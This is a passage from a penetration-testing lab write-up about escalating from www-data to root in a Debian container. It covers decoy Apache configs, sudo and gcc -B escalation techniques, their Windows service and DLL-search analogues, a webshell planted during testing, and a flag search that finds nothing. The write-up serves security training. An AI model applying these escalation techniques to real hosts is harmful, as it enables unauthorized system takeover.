  would have been inapplicable, and §9 explains why that does not make the Windows question moot.

### Design observation — the lab

**This is the best-constructed lab of the ten, and it is undermined by its own naming.** The
mechanism is excellent: a ladder where *each rung names a different program*, so the player cannot
memorise one trick and must re-derive "this program is a capability" six times. Floor 5 in
particular — a compiler driver rather than an interpreter, escalating through subprogram resolution
instead of argument injection — is the kind of step that teaches something. The Scooby-Doo framing
(`daphne`, `velma`, `shaggy`, `fred`, `scooby`) is not decoration; it makes the ladder legible, and
"the mystery of the haunted elevator" is a fair name for it once you are inside.

The problems are all in the *decoys*, and they are the same decoy twice:

1. The catalog promises Windows and ships Debian. Tenth time.
2. The image carries **three** plausible mechanisms for the one behaviour that starts the lab, and
   **two of them are inert** — a vhost `AddHandler` that implies a double extension you do not need,
   and a root-owned `.htaccess` in the upload directory that would be the obvious place to look and
   that `AllowOverride None` has disabled. Worse, `apache2.conf:54` points an `AllowOverride All`
   block at `/var/www/html/uploads`, **a path that does not exist**, while the real one is
   `/var/www/html/themes/uploads`.

Per `decision-making.md` §7 that second point is the serious one. A lab that ships an inert
mitigation teaches the reader that reading a config file is verification. Here, the fragment that
*names the exact behaviour* (`SetHandler … \.jpg$`, root-owned, therefore serious-looking) is the
one that does nothing, and the fragment that *actually decides the outcome* is one unindented line
in the main config with no comment. A differential write test settles it in two minutes; reading the
files and picking the plausible one does not. The learner's takeaway should be the differential, and
the lab as shipped rewards the guess instead.

The minor versioning note, in the same spirit: `/var/www/html/index.html` is dated `2024-11-29`
while `apache2.conf` is `2024-12-01` and the whole Drupal skeleton is `Nov 28 2024`, so the global
`AddType` was added **after** the site content was written. The misconfiguration is a later edit,
not an inherited default.

---

## 9. Windows privilege escalation — the decision criterion

**Provenance, stated first because it is load-bearing: this engagement produced no Windows target.**
The catalogue promises Windows, `docker inspect` reports `linux/amd64`, `/etc/os-release` says
Debian 12, and `nmap` reports Apache on Linux. Everything below is therefore a **criterion**, not a
verified result, and I am labelling it as such rather than dressing up a Linux chain as a Windows
one. `active_directory.md` was **not** touched: this is not an AD domain, has no domain controller,
no SMB, no LDAP and no Kerberos, and inventing an AD section from a Linux sudoers ladder would be
exactly the naming error the methodology spends ten engagements warning about.

The transferable content is the **decision**, and it is smaller than the technique list.

### The one question

> **What does the granted program do with the parts of the command I control — and with the paths it
> resolves other programs through?**

That is the whole criterion, and it is platform-neutral. In this lab:

| Linux instance (measured) | Windows instance (not exercised) |
|---|---|
| `sudoers` grants a **program** — `NOPASSWD: /usr/bin/ruby` with no argument list | SCM grants a **service configuration right** — `SERVICE_CHANGE_CONFIG` / `SERVICE_ALL_ACCESS` on a service you can rewrite |
| The program is a general-purpose interpreter, so the grant is arbitrary code as the target | The service's `ImagePath` resolves a **binary you can replace**, or its directory is writable by a group you are in |
| `gcc -B` resolves its `as`/`cc1`/`ld` subprograms **by name from a prefix I choose** | A service loads a **DLL by search order**; `ImagePath` is unquoted so a space splits it (`C:\Program Files\…`) |
| `NOPASSWD: /usr/bin/sudo` granted to `scooby` is self-referential: `sudo` execs argv | `SeImpersonatePrivilege` + a SYSTEM process, or `SeDebugPrivilege` + a SYSTEM process |
| Escalation = `uid=33 → 0`, measured with `id` at every rung | Escalation = token change; measured with `whoami /all` and `net session` |

**The equivalence is the oracle.** A privilege grant is a *code-execution grant* if and only if the
named program can be made to run attacker-chosen code — by interpreting its argv (F3 floors 1–4, 6),
by argument injection into its own parser (`dpkg --pre-invoke`), or by resolving a program out of a
search path you control (F4, DLL search order, unquoted `ImagePath`). Three different mechanisms,
one test. A reader who has internalised the test does not need the list of interpreters, and will
handle the ones nobody wrote down.

### What the criterion does **not** license

- **Do not collapse "I have admin" into "I have SYSTEM".** They are different tokens, produced by
  different mechanisms, with different severities and different remediations. In this lab the
  distinction would have been concrete: `scooby` is not privileged, and `scooby → root` is a real
  boundary. A report that says "escalated to root" when it reached an admin token is wrong in the
  direction that inflates the finding, which is the direction that gets a report dismissed.
- **Do not report one grant as one finding when it is a chain.** Six `NOPASSWD` rules, six CWEs'
  worth of decisions, six remediations. A reviewer shown "sudoers misconfigured" patches one line
  and the other five are still there — the same argument as `decision-making.md`'s control-plane vs.
  data-plane rule, applied to a ladder.
- **Do not report the elevation without measuring the identity.** `id` on Linux, `whoami /all` on
  Windows, at **every** rung, and `whoami /groups` when the mechanism is a token. Ten engagements in,
  this is the rule that keeps producing the highest-value finding: on this host, `id` at floor 0 is
  what revealed that floor 0 was `www-data` and not root, which is the difference between a one-hop
  engagement and a six-hop one.
- **"I read the grant and it looks narrow" is not a control test.** Probe a program that is *not*
  granted (`sudo -n -u daphne /bin/bash` → `a password is required`) and then one that is. The
  negative result is what turns "sudo is scoped" from a claim into a measurement.

### Where it belongs in this repository

The class is **already present** and I did not add it a second time: `infrastructure.md`'s
Sudo-rule oracle ("read the rule as a *capability grant*, not as a shell"), the Sudo
argument-injection oracle (`dpkg`), the `LD_PREload` entry on the Linux privilege-escalation
checklist, and the `Services` → *Service escalate registry / Executable / Unquoted Service Path /
Service Binary Path* entries under POST Exploitation. What this lab adds to that material is the
**floor-5 oracle** (a granted *driver* whose search path is the attack surface) and the explicit
mapping of the criterion onto the Windows service/ACL primitives — both integrated as prose in
`infrastructure.md`, next to the existing sudo oracles, not as a new technique list.

---

## 10. Rewards

**There is none.** No `FLAG{}` exists in this image, and I am reporting that as a measured absence
rather than inventing a value.

Searched as `uid=0(root)`, over the whole filesystem with `/proc` and `/sys` excluded:

```
# grep -rIlE "FLAG\{|flag\{|congratul|felicidad|reward|hasSuperAdmin" / --exclude-dir=/proc --exclude-dir=/sys
/tmp/rootinner.sh            <- my own search script, matched its own pattern
/usr/share/perl5/Image/ExifTool/QuickTime.pm:1050:    # ... for much reward, see ref)
/usr/share/perl/5.36.0/Pod/Perldoc.pm:1304:    # "Funk is its own reward"
/usr/share/ghostscript/10.00.0/Resource/Init/gs_agl.ps:2206:/ideographiccongratulationparen 16#3237
```

Four hits, none of them a reward: two comments in Perl libraries, a Ghostscript glyph name, and my
own script. A name-based sweep finds only Debian's own packaging marker:

```
# find / -xdev \( -iname '*flag*' -o -iname '*reward*' -o -iname '*secret*' \)
/var/lib/mysql/debian-10.11.flag        <- debconf's mysql-server flag file, Debian packaging
```

`grep -rIl` returns **filenames**, which is the right instrument here — a filesystem that does not
contain the string cannot return it, and a *name* sweep catches a reward stored in a file whose
content is not a flag. I also looked where a reward would be planted and it is empty:
`/var/www/html/.important/` (empty), `/root/` (no `.bash_history` — it is a symlink to
`/dev/null`, which is itself a small anti-forensic touch), `/opt`, `/srv`, `/var/backups` (all
empty).

**The reward for this lab is the escalation itself**, and it is complete: `uid=33(www-data)` to
`uid=0(root)` across six independent privilege boundaries, each one a separate misconfiguration with
its own remediation. Per `decision-making.md`, an absence of reward is a deliverable and must be
derived rather than asserted — this is the derivation.

---

## 11. Restoration

Everything I wrote lives in the container's **writable layer**; the image is untouched. Files created
inside the container:

```
/var/www/html/s.php                       the stable webshell (F6)
/var/www/html/probe.jpg                   docroot copy, used to prove the .jpg mapping is global
/var/www/html/themes/uploads/*.jpg        four probe uploads
/var/www/html/themes/uploads/t.jpg.php    vhost AddHandler probe
/tmp/*.sh /tmp/*.rb /tmp/*.lua            the per-floor launchers
/tmp/h5/ /tmp/elev2/                      the -B subprogram directories
/var/www/html/themes/uploads/.htaccess    the file I overwrote and then deleted (F1 control test)
```

The one item that is not simply "delete it" is
`/var/www/html/themes/uploads/.htaccess`: it shipped as `root:root 0644` and I replaced it with a
blanket-deny control before removing it. **It is not restored**, because the correction is to remove
`AddType application/x-httpd-php .jpg` from `apache2.conf` (F1 remediation) rather than to rely on
an override that `AllowOverride None` had already disabled. The definitive restoration is therefore
to destroy the container, which discards the writable layer entirely:

```bash
docker rm -f elevator_container
docker rmi elevator:latest
```

which returns the host to its shipped state, since the state does not live in the image layer.
`md5sum` verification of the image is unnecessary for the same reason — the tar in
`labs/146/elevator.tar` is byte-identical to what was distributed, and the running container was the
only thing modified.
